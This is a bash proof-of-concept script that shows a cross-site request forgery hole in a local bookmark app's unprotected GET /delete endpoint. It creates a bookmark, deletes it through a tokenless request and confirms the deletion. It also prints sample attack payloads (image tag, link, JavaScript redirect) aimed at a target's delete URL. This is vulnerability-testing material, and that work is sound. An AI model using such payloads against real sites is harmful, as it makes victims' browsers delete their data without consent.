#!/bin/bash

# CSRF POC: Cross-Site Request Forgery on /delete endpoint
# The /delete endpoint uses GET method with no CSRF token, allowing attackers
# to delete bookmarks by making users visit malicious URLs

COOKIES="/tmp/csrf_poc.txt"
rm -f "$COOKIES"

echo "[*] CSRF Vulnerability Test on /delete endpoint"
echo "[*] ============================================"

echo "[*] Step 1: Initialize session"
curl -c "$COOKIES" "http://localhost:5000/list" -s > /dev/null

echo "[*] Step 2: Create a legitimate bookmark"
curl -b "$COOKIES" -c "$COOKIES" -X POST "http://localhost:5000/add" \
  -d "name=VulnerableBookmark&url=http://example.com" -s > /dev/null

echo "[*] Step 3: Verify bookmark exists before CSRF attack"
RESPONSE_BEFORE=$(curl -b "$COOKIES" "http://localhost:5000/list" -s)
FOUND_BEFORE=$(echo "$RESPONSE_BEFORE" | grep -c "VulnerableBookmark")

if [ "$FOUND_BEFORE" -gt 0 ]; then
    echo "[+] Bookmark verified - exists in list"
else
    echo "[-] Failed to create bookmark"
    exit 1
fi

echo "[*] Step 4: Simulate CSRF attack via GET request"
echo "[*] Attacker URL: /delete?name=VulnerableBookmark"
echo "[*] No CSRF token required - attacker can trigger deletion via:"
echo "    - Image tag: <img src='http://target/delete?name=VulnerableBookmark'>"
echo "    - Link: <a href='http://target/delete?name=VulnerableBookmark'>Click me</a>"
echo "    - Redirect: window.location='http://target/delete?name=VulnerableBookmark'"

curl -b "$COOKIES" -c "$COOKIES" "http://localhost:5000/delete?name=VulnerableBookmark" -s > /dev/null

echo "[*] Step 5: Verify bookmark was deleted via CSRF"
RESPONSE_AFTER=$(curl -b "$COOKIES" "http://localhost:5000/list" -s)
FOUND_AFTER=$(echo "$RESPONSE_AFTER" | grep -c "VulnerableBookmark")
NO_URLS=$(echo "$RESPONSE_AFTER" | grep -c "No URLs added")

if [ "$FOUND_AFTER" -eq 0 ] && [ "$NO_URLS" -gt 0 ]; then
    echo "[+] CSRF VULNERABILITY CONFIRMED!"
    echo "[+] Bookmark deleted without any CSRF token validation"
    echo "[+] The /delete endpoint accepts GET requests with no protection"
    exit 0
else
    echo "[-] Deletion failed"
    exit 1
fi
